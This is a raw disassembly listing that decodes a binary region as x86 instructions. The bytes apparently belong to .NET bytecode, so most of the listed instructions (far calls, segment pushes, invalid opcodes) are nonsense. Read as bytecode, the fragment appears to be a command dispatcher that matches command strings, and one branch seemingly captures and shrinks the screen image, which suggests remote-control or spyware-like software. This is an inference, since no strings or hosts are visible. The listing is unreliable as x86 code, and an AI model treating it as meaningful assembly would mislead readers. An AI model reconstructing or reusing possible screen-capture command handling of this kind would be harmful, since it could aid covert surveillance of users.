  403c18:	00 14 fe             	add    %dl,(%esi,%edi,8)
  403c1b:	06                   	push   %es
  403c1c:	44                   	inc    %esp
  403c1d:	00 00                	add    %al,(%eax)
  403c1f:	06                   	push   %es
  403c20:	73 a1                	jae    0x403bc3
  403c22:	00 00                	add    %al,(%eax)
  403c24:	0a 73 a2             	or     -0x5e(%ebx),%dh
  403c27:	00 00                	add    %al,(%eax)
  403c29:	0a 80 20 00 00 04    	or     0x4000020(%eax),%al
  403c2f:	7e 20                	jle    0x403c51
  403c31:	00 00                	add    %al,(%eax)
  403c33:	04 06                	add    $0x6,%al
  403c35:	17                   	pop    %ss
  403c36:	9a 6f bc 00 00 0a 38 	lcall  $0x380a,$0xbc6f
  403c3d:	55                   	push   %ebp
  403c3e:	04 00                	add    $0x0,%al
  403c40:	00 11                	add    %dl,(%ecx)
  403c42:	13 72 b7             	adc    -0x49(%edx),%esi
  403c45:	09 00                	or     %eax,(%eax)
  403c47:	70 16                	jo     0x403c5f
  403c49:	28 5b 00             	sub    %bl,0x0(%ebx)
  403c4c:	00 0a                	add    %cl,(%edx)
  403c4e:	16                   	push   %ss
  403c4f:	33 20                	xor    (%eax),%esp
  403c51:	7e 20                	jle    0x403c73
  403c53:	00 00                	add    %al,(%eax)
  403c55:	04 6f                	add    $0x6f,%al
  403c57:	bb 00 00 0a de       	mov    $0xde0a0000,%ebx
  403c5c:	0f 25                	(bad)
  403c5e:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  403c64:	06                   	push   %es
  403c65:	28 27                	sub    %ah,(%edi)
  403c67:	00 00                	add    %al,(%eax)
  403c69:	0a de                	or     %dh,%bl
  403c6b:	00 38                	add    %bh,(%eax)
  403c6d:	25 04 00 00 11       	and    $0x11000004,%eax
  403c72:	13 72 cd             	adc    -0x33(%edx),%esi
  403c75:	09 00                	or     %eax,(%eax)
  403c77:	70 16                	jo     0x403c8f
  403c79:	28 5b 00             	sub    %bl,0x0(%ebx)
  403c7c:	00 0a                	add    %cl,(%edx)
  403c7e:	16                   	push   %ss
  403c7f:	33 1e                	xor    (%esi),%ebx
  403c81:	72 cd                	jb     0x403c50
  403c83:	09 00                	or     %eax,(%eax)
  403c85:	70 7e                	jo     0x403d05
  403c87:	0a 00                	or     (%eax),%al
  403c89:	00 04 28             	add    %al,(%eax,%ebp,1)
  403c8c:	6e                   	outsb  %ds:(%esi),(%dx)
  403c8d:	00 00                	add    %al,(%eax)
  403c8f:	06                   	push   %es
  403c90:	28 28                	sub    %ch,(%eax)
  403c92:	00 00                	add    %al,(%eax)
  403c94:	0a 28                	or     (%eax),%ch
  403c96:	2f                   	das
  403c97:	00 00                	add    %al,(%eax)
  403c99:	06                   	push   %es
  403c9a:	38 f7                	cmp    %dh,%bh
  403c9c:	03 00                	add    (%eax),%eax
  403c9e:	00 11                	add    %dl,(%ecx)
  403ca0:	13 72 d9             	adc    -0x27(%edx),%esi
  403ca3:	09 00                	or     %eax,(%eax)
  403ca5:	70 16                	jo     0x403cbd
  403ca7:	28 5b 00             	sub    %bl,0x0(%ebx)
  403caa:	00 0a                	add    %cl,(%edx)
  403cac:	16                   	push   %ss
  403cad:	33 6a 1f             	xor    0x1f(%edx),%ebp
  403cb0:	25 28 3e 00 00       	and    $0x3e28,%eax
  403cb5:	0a 72 e5             	or     -0x1b(%edx),%dh
  403cb8:	09 00                	or     %eax,(%eax)
  403cba:	70 28                	jo     0x403ce4
  403cbc:	1f                   	pop    %ds
  403cbd:	00 00                	add    %al,(%eax)
  403cbf:	0a 13                	or     (%ebx),%dl
  403cc1:	07                   	pop    %es
  403cc2:	1d 8d 26 00 00       	sbb    $0x268d,%eax
  403cc7:	01 13                	add    %edx,(%ebx)
  403cc9:	14 11                	adc    $0x11,%al
  403ccb:	14 16                	adc    $0x16,%al
  403ccd:	72 d9                	jb     0x403ca8
  403ccf:	09 00                	or     %eax,(%eax)
  403cd1:	70 a2                	jo     0x403c75
  403cd3:	11 14 17             	adc    %edx,(%edi,%edx,1)
  403cd6:	7e 0a                	jle    0x403ce2
  403cd8:	00 00                	add    %al,(%eax)
  403cda:	04 a2                	add    $0xa2,%al
  403cdc:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  403cdf:	28 6e 00             	sub    %ch,0x0(%esi)
  403ce2:	00 06                	add    %al,(%esi)
  403ce4:	a2 11 14 19 7e       	mov    %al,0x7e191411
  403ce9:	0a 00                	or     (%eax),%al
  403ceb:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403cee:	11 14 1a             	adc    %edx,(%edx,%ebx,1)
  403cf1:	11 07                	adc    %eax,(%edi)
  403cf3:	a2 11 14 1b 7e       	mov    %al,0x7e1b1411
  403cf8:	0a 00                	or     (%eax),%al
  403cfa:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403cfd:	11 14 1c             	adc    %edx,(%esp,%ebx,1)
  403d00:	11 07                	adc    %eax,(%edi)
  403d02:	28 bd 00 00 0a a2    	sub    %bh,-0x5df60000(%ebp)
  403d08:	11 14 28             	adc    %edx,(%eax,%ebp,1)
  403d0b:	36 00 00             	add    %al,%ss:(%eax)
  403d0e:	0a 28                	or     (%eax),%ch
  403d10:	2f                   	das
  403d11:	00 00                	add    %al,(%eax)
  403d13:	06                   	push   %es
  403d14:	38 7d 03             	cmp    %bh,0x3(%ebp)
  403d17:	00 00                	add    %al,(%eax)
  403d19:	11 13                	adc    %edx,(%ebx)
  403d1b:	72 0b                	jb     0x403d28
  403d1d:	0a 00                	or     (%eax),%al
  403d1f:	70 16                	jo     0x403d37
  403d21:	28 5b 00             	sub    %bl,0x0(%ebx)
  403d24:	00 0a                	add    %cl,(%edx)
  403d26:	16                   	push   %ss
  403d27:	40                   	inc    %eax
  403d28:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403d29:	00 00                	add    %al,(%eax)
  403d2b:	00 06                	add    %al,(%esi)
  403d2d:	17                   	pop    %ss
  403d2e:	9a 06 18 9a 28 be 00 	lcall  $0xbe,$0x289a1806
  403d35:	00 0a                	add    %cl,(%edx)
  403d37:	1b 8d 26 00 00 01    	sbb    0x1000026(%ebp),%ecx
  403d3d:	13 14 11             	adc    (%ecx,%edx,1),%edx
  403d40:	14 16                	adc    $0x16,%al
  403d42:	72 19                	jb     0x403d5d
  403d44:	0a 00                	or     (%eax),%al
  403d46:	70 a2                	jo     0x403cea
  403d48:	11 14 17             	adc    %edx,(%edi,%edx,1)
  403d4b:	7e 0a                	jle    0x403d57
  403d4d:	00 00                	add    %al,(%eax)
  403d4f:	04 a2                	add    $0xa2,%al
  403d51:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  403d54:	28 6e 00             	sub    %ch,0x0(%esi)
  403d57:	00 06                	add    %al,(%esi)
  403d59:	a2 11 14 19 7e       	mov    %al,0x7e191411
  403d5e:	0a 00                	or     (%eax),%al
  403d60:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403d63:	11 14 1a             	adc    %edx,(%edx,%ebx,1)
  403d66:	72 2b                	jb     0x403d93
  403d68:	0a 00                	or     (%eax),%al
  403d6a:	70 a2                	jo     0x403d0e
  403d6c:	11 14 28             	adc    %edx,(%eax,%ebp,1)
  403d6f:	36 00 00             	add    %al,%ss:(%eax)
  403d72:	0a 28                	or     (%eax),%ch
  403d74:	2f                   	das
  403d75:	00 00                	add    %al,(%eax)
  403d77:	06                   	push   %es
  403d78:	de 52 25             	ficoms 0x25(%edx)
  403d7b:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  403d81:	08 1b                	or     %bl,(%ebx)
  403d83:	8d 26                	lea    (%esi),%esp
  403d85:	00 00                	add    %al,(%eax)
  403d87:	01 13                	add    %edx,(%ebx)
  403d89:	14 11                	adc    $0x11,%al
  403d8b:	14 16                	adc    $0x16,%al
  403d8d:	72 59                	jb     0x403de8
  403d8f:	0a 00                	or     (%eax),%al
  403d91:	70 a2                	jo     0x403d35
  403d93:	11 14 17             	adc    %edx,(%edi,%edx,1)
  403d96:	7e 0a                	jle    0x403da2
  403d98:	00 00                	add    %al,(%eax)
  403d9a:	04 a2                	add    $0xa2,%al
  403d9c:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  403d9f:	28 6e 00             	sub    %ch,0x0(%esi)
  403da2:	00 06                	add    %al,(%esi)
  403da4:	a2 11 14 19 7e       	mov    %al,0x7e191411
  403da9:	0a 00                	or     (%eax),%al
  403dab:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403dae:	11 14 1a             	adc    %edx,(%edx,%ebx,1)
  403db1:	11 08                	adc    %ecx,(%eax)
  403db3:	6f                   	outsl  %ds:(%esi),(%dx)
  403db4:	bf 00 00 0a a2       	mov    $0xa20a0000,%edi
  403db9:	11 14 28             	adc    %edx,(%eax,%ebp,1)
  403dbc:	36 00 00             	add    %al,%ss:(%eax)
  403dbf:	0a 28                	or     (%eax),%ch
  403dc1:	2f                   	das
  403dc2:	00 00                	add    %al,(%eax)
  403dc4:	06                   	push   %es
  403dc5:	28 27                	sub    %ah,(%edi)
  403dc7:	00 00                	add    %al,(%eax)
  403dc9:	0a de                	or     %dh,%bl
  403dcb:	00 38                	add    %bh,(%eax)
  403dcd:	c5 02                	lds    (%edx),%eax
  403dcf:	00 00                	add    %al,(%eax)
  403dd1:	11 13                	adc    %edx,(%ebx)
  403dd3:	72 6b                	jb     0x403e40
  403dd5:	0a 00                	or     (%eax),%al
  403dd7:	70 16                	jo     0x403def
  403dd9:	28 5b 00             	sub    %bl,0x0(%ebx)
  403ddc:	00 0a                	add    %cl,(%edx)
  403dde:	16                   	push   %ss
  403ddf:	33 0f                	xor    (%edi),%ecx
  403de1:	72 6b                	jb     0x403e4e
  403de3:	0a 00                	or     (%eax),%al
  403de5:	70 28                	jo     0x403e0f
  403de7:	2f                   	das
  403de8:	00 00                	add    %al,(%eax)
  403dea:	06                   	push   %es
  403deb:	38 a6 02 00 00 11    	cmp    %ah,0x11000002(%esi)
  403df1:	13 72 75             	adc    0x75(%edx),%esi
  403df4:	0a 00                	or     (%eax),%al
  403df6:	70 16                	jo     0x403e0e
  403df8:	28 5b 00             	sub    %bl,0x0(%ebx)
  403dfb:	00 0a                	add    %cl,(%edx)
  403dfd:	16                   	push   %ss
  403dfe:	33 40 06             	xor    0x6(%eax),%eax
  403e01:	80 1d 00 00 04 06 17 	sbbb   $0x17,0x6040000
  403e08:	9a 28 71 00 00 06 2d 	lcall  $0x2d06,$0x7128
  403e0f:	19 72 83             	sbb    %esi,-0x7d(%edx)
  403e12:	0a 00                	or     (%eax),%al
  403e14:	70 7e                	jo     0x403e94
  403e16:	0a 00                	or     (%eax),%al
  403e18:	00 04 06             	add    %al,(%esi,%eax,1)
  403e1b:	17                   	pop    %ss
  403e1c:	9a 28 28 00 00 0a 28 	lcall  $0x280a,$0x2828
  403e23:	2f                   	das
  403e24:	00 00                	add    %al,(%eax)
  403e26:	06                   	push   %es
  403e27:	2b 12                	sub    (%edx),%edx
  403e29:	06                   	push   %es
  403e2a:	17                   	pop    %ss
  403e2b:	9a 28 71 00 00 06 28 	lcall  $0x2806,$0x7128
  403e32:	72 00                	jb     0x403e34
  403e34:	00 06                	add    %al,(%esi)
  403e36:	28 38                	sub    %bh,(%eax)
  403e38:	00 00                	add    %al,(%eax)
  403e3a:	06                   	push   %es
  403e3b:	38 56 02             	cmp    %dl,0x2(%esi)
  403e3e:	00 00                	add    %al,(%eax)
  403e40:	11 13                	adc    %edx,(%ebx)
  403e42:	72 99                	jb     0x403ddd
  403e44:	0a 00                	or     (%eax),%al
  403e46:	70 16                	jo     0x403e5e
  403e48:	28 5b 00             	sub    %bl,0x0(%ebx)
  403e4b:	00 0a                	add    %cl,(%edx)
  403e4d:	16                   	push   %ss
  403e4e:	33 26                	xor    (%esi),%esp
  403e50:	06                   	push   %es
  403e51:	18 9a 28 b2 00 00    	sbb    %bl,0xb228(%edx)
  403e57:	0a 13                	or     (%ebx),%dl
  403e59:	09 06                	or     %eax,(%esi)
  403e5b:	17                   	pop    %ss
  403e5c:	9a 11 09 28 70 00 00 	lcall  $0x0,$0x70280911
  403e63:	06                   	push   %es
  403e64:	26 11 09             	adc    %ecx,%es:(%ecx)
  403e67:	28 72 00             	sub    %dh,0x0(%edx)
  403e6a:	00 06                	add    %al,(%esi)
  403e6c:	28 38                	sub    %bh,(%eax)
  403e6e:	00 00                	add    %al,(%eax)
  403e70:	06                   	push   %es
  403e71:	38 20                	cmp    %ah,(%eax)
  403e73:	02 00                	add    (%eax),%al
  403e75:	00 11                	add    %dl,(%ecx)
  403e77:	13 72 af             	adc    -0x51(%edx),%esi
  403e7a:	0a 00                	or     (%eax),%al
  403e7c:	70 16                	jo     0x403e94
  403e7e:	28 5b 00             	sub    %bl,0x0(%ebx)
  403e81:	00 0a                	add    %cl,(%edx)
  403e83:	16                   	push   %ss
  403e84:	33 28                	xor    (%eax),%ebp
  403e86:	28 04 00             	sub    %al,(%eax,%eax,1)
  403e89:	00 06                	add    %al,(%esi)
  403e8b:	6f                   	outsl  %ds:(%esi),(%dx)
  403e8c:	3a 00                	cmp    (%eax),%al
  403e8e:	00 0a                	add    %cl,(%edx)
  403e90:	6f                   	outsl  %ds:(%esi),(%dx)
  403e91:	3b 00                	cmp    (%eax),%eax
  403e93:	00 0a                	add    %cl,(%edx)
  403e95:	7e 2b                	jle    0x403ec2
  403e97:	00 00                	add    %al,(%eax)
  403e99:	04 6f                	add    $0x6f,%al
  403e9b:	c0 00 00             	rolb   $0x0,(%eax)
  403e9e:	0a 72 cb             	or     -0x35(%edx),%dh
  403ea1:	0a 00                	or     (%eax),%al
  403ea3:	70 28                	jo     0x403ecd
  403ea5:	39 00                	cmp    %eax,(%eax)
  403ea7:	00 06                	add    %al,(%esi)
  403ea9:	38 e8                	cmp    %ch,%al
  403eab:	01 00                	add    %eax,(%eax)
  403ead:	00 11                	add    %dl,(%ecx)
  403eaf:	13 72 ed             	adc    -0x13(%edx),%esi
  403eb2:	0a 00                	or     (%eax),%al
  403eb4:	70 16                	jo     0x403ecc
  403eb6:	28 5b 00             	sub    %bl,0x0(%ebx)
  403eb9:	00 0a                	add    %cl,(%edx)
  403ebb:	16                   	push   %ss
  403ebc:	33 4b 1b             	xor    0x1b(%ebx),%ecx
  403ebf:	8d 26                	lea    (%esi),%esp
  403ec1:	00 00                	add    %al,(%eax)
  403ec3:	01 13                	add    %edx,(%ebx)
  403ec5:	14 11                	adc    $0x11,%al
  403ec7:	14 16                	adc    $0x16,%al
  403ec9:	72 ed                	jb     0x403eb8
  403ecb:	0a 00                	or     (%eax),%al
  403ecd:	70 a2                	jo     0x403e71
  403ecf:	11 14 17             	adc    %edx,(%edi,%edx,1)
  403ed2:	7e 0a                	jle    0x403ede
  403ed4:	00 00                	add    %al,(%eax)
  403ed6:	04 a2                	add    $0xa2,%al
  403ed8:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  403edb:	28 6e 00             	sub    %ch,0x0(%esi)
  403ede:	00 06                	add    %al,(%esi)
  403ee0:	a2 11 14 19 7e       	mov    %al,0x7e191411
  403ee5:	0a 00                	or     (%eax),%al
  403ee7:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403eea:	11 14 1a             	adc    %edx,(%edx,%ebx,1)
  403eed:	7e 11                	jle    0x403f00
  403eef:	00 00                	add    %al,(%eax)
  403ef1:	04 28                	add    $0x28,%al
  403ef3:	bd 00 00 0a a2       	mov    $0xa20a0000,%ebp
  403ef8:	11 14 28             	adc    %edx,(%eax,%ebp,1)
  403efb:	36 00 00             	add    %al,%ss:(%eax)
  403efe:	0a 28                	or     (%eax),%ch
  403f00:	2f                   	das
  403f01:	00 00                	add    %al,(%eax)
  403f03:	06                   	push   %es
  403f04:	38 8d 01 00 00 11    	cmp    %cl,0x11000001(%ebp)
  403f0a:	13 72 03             	adc    0x3(%edx),%esi
  403f0d:	0b 00                	or     (%eax),%eax
  403f0f:	70 16                	jo     0x403f27
  403f11:	28 5b 00             	sub    %bl,0x0(%ebx)
  403f14:	00 0a                	add    %cl,(%edx)
  403f16:	16                   	push   %ss
  403f17:	40                   	inc    %eax
  403f18:	7a 01                	jp     0x403f1b
  403f1a:	00 00                	add    %al,(%eax)
  403f1c:	7e 27                	jle    0x403f45
  403f1e:	00 00                	add    %al,(%eax)
  403f20:	04 2d                	add    $0x2d,%al
  403f22:	0d 18 28 61 00       	or     $0x612818,%eax
  403f27:	00 06                	add    %al,(%esi)
  403f29:	26 17                	es pop %ss
  403f2b:	80 27 00             	andb   $0x0,(%edi)
  403f2e:	00 04 de             	add    %al,(%esi,%ebx,8)
  403f31:	0c 28                	or     $0x28,%al
  403f33:	25 00 00 0a 28       	and    $0x280a0000,%eax
  403f38:	27                   	daa
  403f39:	00 00                	add    %al,(%eax)
  403f3b:	0a de                	or     %dh,%bl
  403f3d:	00 28                	add    %ch,(%eax)
  403f3f:	c1 00 00             	roll   $0x0,(%eax)
  403f42:	0a 6f c2             	or     -0x3e(%edi),%ch
  403f45:	00 00                	add    %al,(%eax)
  403f47:	0a 13                	or     (%ebx),%dl
  403f49:	0c 28                	or     $0x28,%al
  403f4b:	c1 00 00             	roll   $0x0,(%eax)
  403f4e:	0a 6f c2             	or     -0x3e(%edi),%ch
  403f51:	00 00                	add    %al,(%eax)
  403f53:	0a 13                	or     (%ebx),%dl
  403f55:	18 12                	sbb    %dl,(%edx)
  403f57:	18 28                	sbb    %ch,(%eax)
  403f59:	c3                   	ret
  403f5a:	00 00                	add    %al,(%eax)
  403f5c:	0a 12                	or     (%edx),%dl
  403f5e:	0c 28                	or     $0x28,%al
  403f60:	c4 00                	les    (%eax),%eax
  403f62:	00 0a                	add    %cl,(%edx)
  403f64:	20 05 10 02 00 73    	and    %al,0x73000210
  403f6a:	c5 00                	lds    (%eax),%eax
  403f6c:	00 0a                	add    %cl,(%edx)
  403f6e:	13 0e                	adc    (%esi),%ecx
  403f70:	11 0e                	adc    %ecx,(%esi)
  403f72:	28 c6                	sub    %al,%dh
  403f74:	00 00                	add    %al,(%eax)
  403f76:	0a 13                	or     (%ebx),%dl
  403f78:	0a 12                	or     (%edx),%dl
  403f7a:	0b 11                	or     (%ecx),%edx
  403f7c:	0e                   	push   %cs
  403f7d:	6f                   	outsl  %ds:(%esi),(%dx)
  403f7e:	c7 00 00 0a 11 0e    	movl   $0xe110a00,(%eax)
  403f84:	6f                   	outsl  %ds:(%esi),(%dx)
  403f85:	c8 00 00 0a          	enter  $0x0,$0xa
  403f89:	28 c9                	sub    %cl,%cl
  403f8b:	00 00                	add    %al,(%eax)
  403f8d:	0a 11                	or     (%ecx),%dl
  403f8f:	0a 16                	or     (%esi),%dl
  403f91:	16                   	push   %ss
  403f92:	16                   	push   %ss
  403f93:	16                   	push   %ss
  403f94:	11 0b                	adc    %ecx,(%ebx)
  403f96:	20 20                	and    %ah,(%eax)
  403f98:	00 cc                	add    %cl,%ah
  403f9a:	00 6f ca             	add    %ch,-0x36(%edi)
  403f9d:	00 00                	add    %al,(%eax)
  403f9f:	0a 73 6c             	or     0x6c(%ebx),%dh
  403fa2:	00 00                	add    %al,(%eax)
  403fa4:	0a 13                	or     (%ebx),%dl
  403fa6:	0f 20 00             	mov    %cr0,%eax
  403fa9:	01 00                	add    %eax,(%eax)
  403fab:	00 20                	add    %ah,(%eax)
  403fad:	9c                   	pushf
  403fae:	00 00                	add    %al,(%eax)
  403fb0:	00 73 cb             	add    %dh,-0x35(%ebx)
  403fb3:	00 00                	add    %al,(%eax)
  403fb5:	0a 13                	or     (%ebx),%dl
  403fb7:	10 11                	adc    %dl,(%ecx)
  403fb9:	10 28                	adc    %ch,(%eax)
  403fbb:	c6 00 00             	movb   $0x0,(%eax)
  403fbe:	0a 13                	or     (%ebx),%dl
  403fc0:	0d 11 0d 11 0e       	or     $0xe110d11,%eax
  403fc5:	12 18                	adc    (%eax),%bl
  403fc7:	16                   	push   %ss
  403fc8:	16                   	push   %ss
  403fc9:	20 00                	and    %al,(%eax)
  403fcb:	01 00                	add    %eax,(%eax)
  403fcd:	00 20                	add    %ah,(%eax)
  403fcf:	9c                   	pushf
  403fd0:	00 00                	add    %al,(%eax)
  403fd2:	00 28                	add    %ch,(%eax)
  403fd4:	cc                   	int3
  403fd5:	00 00                	add    %al,(%eax)
  403fd7:	0a 11                	or     (%ecx),%dl
  403fd9:	18 12                	sbb    %dl,(%edx)
  403fdb:	17                   	pop    %ss
  403fdc:	16                   	push   %ss
  403fdd:	16                   	push   %ss
  403fde:	11 0e                	adc    %ecx,(%esi)
  403fe0:	6f                   	outsl  %ds:(%esi),(%dx)
  403fe1:	c7 00 00 0a 11 0e    	movl   $0xe110a00,(%eax)
  403fe7:	6f                   	outsl  %ds:(%esi),(%dx)
  403fe8:	c8 00 00 0a          	enter  $0x0,$0xa
  403fec:	28 cc                	sub    %cl,%ah
  403fee:	00 00                	add    %al,(%eax)
  403ff0:	0a 11                	or     (%ecx),%dl
  403ff2:	17                   	pop    %ss
  403ff3:	18 6f cd             	sbb    %ch,-0x33(%edi)
  403ff6:	00 00                	add    %al,(%eax)
  403ff8:	0a 11                	or     (%ecx),%dl
  403ffa:	10 11                	adc    %dl,(%ecx)
  403ffc:	0f 28 ce             	movaps %xmm6,%xmm1
  403fff:	00 00                	add    %al,(%eax)
  404001:	0a 6f cf             	or     -0x31(%edi),%ch
  404004:	00 00                	add    %al,(%eax)
  404006:	0a 1b                	or     (%ebx),%bl
  404008:	8d 26                	lea    (%esi),%esp
  40400a:	00 00                	add    %al,(%eax)
  40400c:	01 13                	add    %edx,(%ebx)
  40400e:	14 11                	adc    $0x11,%al
  404010:	14 16                	adc    $0x16,%al
  404012:	72 0d                	jb     0x404021
  404014:	0b 00                	or     (%eax),%eax
  404016:	70 a2                	jo     0x403fba
  404018:	11 14 17             	adc    %edx,(%edi,%edx,1)
  40401b:	7e 0a                	jle    0x404027
  40401d:	00 00                	add    %al,(%eax)
  40401f:	04 a2                	add    $0xa2,%al
  404021:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  404024:	28 6e 00             	sub    %ch,0x0(%esi)
  404027:	00 06                	add    %al,(%esi)
  404029:	a2 11 14 19 7e       	mov    %al,0x7e191411
  40402e:	0a 00                	or     (%eax),%al
  404030:	00 04 a2             	add    %al,(%edx,%eiz,4)
  404033:	11 14 1a             	adc    %edx,(%edx,%ebx,1)
  404036:	11 0f                	adc    %ecx,(%edi)
  404038:	6f                   	outsl  %ds:(%esi),(%dx)
  404039:	9b                   	fwait
  40403a:	00 00                	add    %al,(%eax)
  40403c:	0a 28                	or     (%eax),%ch
  40403e:	73 00                	jae    0x404040
  404040:	00 06                	add    %al,(%esi)
  404042:	28 d0                	sub    %dl,%al
  404044:	00 00                	add    %al,(%eax)
  404046:	0a a2 11 14 28 36    	or     0x36281411(%edx),%ah
  40404c:	00 00                	add    %al,(%eax)
  40404e:	0a 28                	or     (%eax),%ch
  404050:	2f                   	das
  404051:	00 00                	add    %al,(%eax)
  404053:	06                   	push   %es
  404054:	11 0a                	adc    %ecx,(%edx)
  404056:	6f                   	outsl  %ds:(%esi),(%dx)
  404057:	d1 00                	roll   $1,(%eax)
  404059:	00 0a                	add    %cl,(%edx)
  40405b:	11 0f                	adc    %ecx,(%edi)
  40405d:	6f                   	outsl  %ds:(%esi),(%dx)
  40405e:	9d                   	popf
  40405f:	00 00                	add    %al,(%eax)
  404061:	0a 11                	or     (%ecx),%dl
  404063:	10 6f d2             	adc    %ch,-0x2e(%edi)
  404066:	00 00                	add    %al,(%eax)
  404068:	0a 11                	or     (%ecx),%dl
  40406a:	0d 6f d1 00 00       	or     $0xd16f,%eax
  40406f:	0a 11                	or     (%ecx),%dl
  404071:	0e                   	push   %cs
  404072:	6f                   	outsl  %ds:(%esi),(%dx)
  404073:	d2 00                	rolb   %cl,(%eax)
  404075:	00 0a                	add    %cl,(%edx)
  404077:	de 0c 28             	fimuls (%eax,%ebp,1)
  40407a:	25 00 00 0a 28       	and    $0x280a0000,%eax
  40407f:	27                   	daa
  404080:	00 00                	add    %al,(%eax)
  404082:	0a de                	or     %dh,%bl
  404084:	00 de                	add    %bl,%dh
  404086:	0f 25                	(bad)
  404088:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  40408e:	11 28                	adc    %ebp,(%eax)
  404090:	27                   	daa
  404091:	00 00                	add    %al,(%eax)
  404093:	0a de                	or     %dh,%bl
  404095:	00 de                	add    %bl,%dh
  404097:	1b 25 28 25 00 00    	sbb    0x2528,%esp
  40409d:	0a 13                	or     (%ebx),%dl
  40409f:	12 11                	adc    (%ecx),%dl
  4040a1:	12 6f bf             	adc    -0x41(%edi),%ch
  4040a4:	00 00                	add    %al,(%eax)
  4040a6:	0a 28                	or     (%eax),%ch
  4040a8:	3a 00                	cmp    (%eax),%al
  4040aa:	00 06                	add    %al,(%esi)
  4040ac:	28 27                	sub    %ah,(%edi)
  4040ae:	00 00                	add    %al,(%eax)
  4040b0:	0a de                	or     %dh,%bl
  4040b2:	00 2a                	add    %ch,(%edx)
  4040b4:	41                   	inc    %ecx
  4040b5:	f4                   	hlt
  4040b6:	00 00                	add    %al,(%eax)
  4040b8:	00 00                	add    %al,(%eax)
  4040ba:	00 00                	add    %al,(%eax)
  4040bc:	65 01 00             	add    %eax,%gs:(%eax)
  4040bf:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4040c2:	00 00                	add    %al,(%eax)
  4040c4:	81 01 00 00 0c 00    	addl   $0xc0000,(%ecx)
  4040ca:	00 00                	add    %al,(%eax)
  4040cc:	29 00                	sub    %eax,(%eax)
  4040ce:	00 01                	add    %al,(%ecx)
  4040d0:	00 00                	add    %al,(%eax)
  4040d2:	00 00                	add    %al,(%eax)
  4040d4:	98                   	cwtl
  4040d5:	02 00                	add    (%eax),%al
  4040d7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4040da:	00 00                	add    %al,(%eax)
  4040dc:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4040dd:	02 00                	add    (%eax),%al
  4040df:	00 0e                	add    %cl,(%esi)
  4040e1:	00 00                	add    %al,(%eax)
  4040e3:	00 29                	add    %ch,(%ecx)
  4040e5:	00 00                	add    %al,(%eax)
  4040e7:	01 00                	add    %eax,(%eax)
  4040e9:	00 00                	add    %al,(%eax)
  4040eb:	00 ea                	add    %ch,%dl
  4040ed:	02 00                	add    (%eax),%al
  4040ef:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4040f2:	00 00                	add    %al,(%eax)
  4040f4:	f6 02 00             	testb  $0x0,(%edx)
  4040f7:	00 0f                	add    %cl,(%edi)
  4040f9:	00 00                	add    %al,(%eax)
  4040fb:	00 29                	add    %ch,(%ecx)
  4040fd:	00 00                	add    %al,(%eax)
  4040ff:	01 00                	add    %eax,(%eax)
  404101:	00 00                	add    %al,(%eax)
  404103:	00 1a                	add    %bl,(%edx)
  404105:	03 00                	add    (%eax),%eax
  404107:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40410a:	00 00                	add    %al,(%eax)
  40410c:	26 03 00             	add    %es:(%eax),%eax
  40410f:	00 0f                	add    %cl,(%edi)
  404111:	00 00                	add    %al,(%eax)
  404113:	00 29                	add    %ch,(%ecx)
  404115:	00 00                	add    %al,(%eax)
  404117:	01 00                	add    %eax,(%eax)
  404119:	00 00                	add    %al,(%eax)
  40411b:	00 6d 03             	add    %ch,0x3(%ebp)
  40411e:	00 00                	add    %al,(%eax)
  404120:	0c 00                	or     $0x0,%al
  404122:	00 00                	add    %al,(%eax)
  404124:	79 03                	jns    0x404129
  404126:	00 00                	add    %al,(%eax)
  404128:	0f 00 00             	sldt   (%eax)
  40412b:	00 29                	add    %ch,(%ecx)
  40412d:	00 00                	add    %al,(%eax)
  40412f:	01 00                	add    %eax,(%eax)
  404131:	00 00                	add    %al,(%eax)
  404133:	00 48 04             	add    %cl,0x4(%eax)
  404136:	00 00                	add    %al,(%eax)
  404138:	4e                   	dec    %esi
  404139:	00 00                	add    %al,(%eax)
  40413b:	00 96 04 00 00 52    	add    %dl,0x52000004(%esi)
  404141:	00 00                	add    %al,(%eax)
  404143:	00 29                	add    %ch,(%ecx)
  404145:	00 00                	add    %al,(%eax)
  404147:	01 00                	add    %eax,(%eax)
  404149:	00 00                	add    %al,(%eax)
  40414b:	00 38                	add    %bh,(%eax)
  40414d:	06                   	push   %es
  40414e:	00 00                	add    %al,(%eax)
  404150:	16                   	push   %ss
  404151:	00 00                	add    %al,(%eax)
  404153:	00 4e 06             	add    %cl,0x6(%esi)
  404156:	00 00                	add    %al,(%eax)
  404158:	0c 00                	or     $0x0,%al
  40415a:	00 00                	add    %al,(%eax)
  40415c:	29 00                	sub    %eax,(%eax)
  40415e:	00 01                	add    %al,(%ecx)
  404160:	00 00                	add    %al,(%eax)
  404162:	00 00                	add    %al,(%eax)
  404164:	70 07                	jo     0x40416d
  404166:	00 00                	add    %al,(%eax)
  404168:	25 00 00 00 95       	and    $0x95000000,%eax
  40416d:	07                   	pop    %es
  40416e:	00 00                	add    %al,(%eax)
  404170:	0c 00                	or     $0x0,%al
  404172:	00 00                	add    %al,(%eax)
  404174:	29 00                	sub    %eax,(%eax)
  404176:	00 01                	add    %al,(%ecx)
  404178:	00 00                	add    %al,(%eax)
  40417a:	00 00                	add    %al,(%eax)
  40417c:	38 06                	cmp    %al,(%esi)
  40417e:	00 00                	add    %al,(%eax)
  404180:	6b 01 00             	imul   $0x0,(%ecx),%eax
  404183:	00 a3 07 00 00 0f    	add    %ah,0xf000007(%ebx)
  404189:	00 00                	add    %al,(%eax)
  40418b:	00 29                	add    %ch,(%ecx)
  40418d:	00 00                	add    %al,(%eax)
  40418f:	01 00                	add    %eax,(%eax)
